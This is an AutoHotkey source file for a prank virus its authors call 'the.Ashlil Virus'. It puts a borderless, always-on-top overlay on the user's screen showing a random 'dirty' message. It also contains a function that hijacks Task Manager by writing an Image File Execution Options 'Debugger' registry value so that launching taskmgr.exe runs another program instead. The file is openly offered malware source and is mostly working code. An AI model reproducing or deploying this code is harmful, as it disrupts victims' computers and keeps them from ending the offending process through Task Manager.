/*
	the.Ashlil Virus 
     // core.ahk \\  

  Author(s):-     pSych0 C0d3r		  &&       cyBer gHo$t     
  Contact:-  pSych0.c0d3r@gmail.com       gh0$t.(yber@gmail.com

  Description:- 
	Show some dirty messages....
	
  [NOTES]:-
*/

#NoEnv  						;Recommended for performance.
#SingleInstance Ignore			;Make Single instance application.
#Persistent						;Keep running until the user asks to exit.
; #NoTrayIcon						;Ensures that no icon is visible.
SetWorkingDir %A_ScriptDir%		;Ensures a consistent starting directory.
SendMode Input  				;Recommended due to its superior speed and reliability.

SetBatchLines -1				;For Speed

OnExit, Exit

#Include Data\Message.ahk

;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Code Begins

Gui 99: Show, Hide, ashlilMsg
OnMessage(0xBEEF, "rcvMsg")

Goto, ShowTextOnScreen

; SetTimer, ShowMessageBox, % rndInterval(1,2)
; Msgbox, % rndInterval(1,2)
Return

;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Misc.Labels()

ShowTextOnScreen:
	; Start GDI+
	If !pToken := Gdip_Startup()
		Return

	;Create a Gui
	Gui, 69: -Caption +E0x80000 +LastFound +AlwaysOnTop +ToolWindow
	Gui, 69: Show, NA
	hwnd1 := WinExist()

	;Dimensions of our Image
	Width := 500, Height := 500

	;Normal GDI+ Sh!t that i never understood
	hbm := CreateDIBSection(Width, Height), hdc := CreateCompatibleDC()
	obm := SelectObject(hdc, hbm), G := Gdip_GraphicsFromHDC(hdc)
	Gdip_SetInterpolationMode(G, 7)

	;The Font
	Font = Calibri
	hFamily := Gdip_FontFamilyCreate(Font), Gdip_DeleteFontFamily(hFamily)

	;Write Random Message On Screen
	Random, Rnd, 1, 2
	text := onScreenTitle%Rnd%, ops := onScreenText%Rnd%
	Gdip_TextToGraphics(G, text, ops, Font, Width, Height)
	UpdateLayeredWindow(hwnd1, hdc, (A_ScreenWidth-Width)//2, (A_ScreenHeight-Height)//2, Width, Height)

	;Normal GDI+ Cleanup
	SelectObject(hdc, obm), DeleteObject(hbm)
	DeleteDC(hdc), Gdip_DeleteGraphics(G)
	
	SetTimer, HideOnScreenText, -2000
Return

ShowMessageBox:
	SetTimer, ShowMessageBox, Off
	Msgbox, Activated
Return

HideOnScreenText:
	Gui, 69: Destroy
Return

Exit:
	Gdip_Shutdown(pToken)
ExitApp

;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Misc.Functions()

rndInterval(s,e)
{
	Random, rndInterval, s*60000, e*60000
	Return rndInterval
}

hjckTskMn(param)
{
	If (param = "Remove")
		RegDelete, HKLM, SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe
	Else
		RegWrite, REG_SZ, HKLM, SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe, Debugger, E:\a.exe
}

rcvMsg(msg)
{
	If (msg = 5050)
		ExitApp, 2
	Else
		Return, % msg
}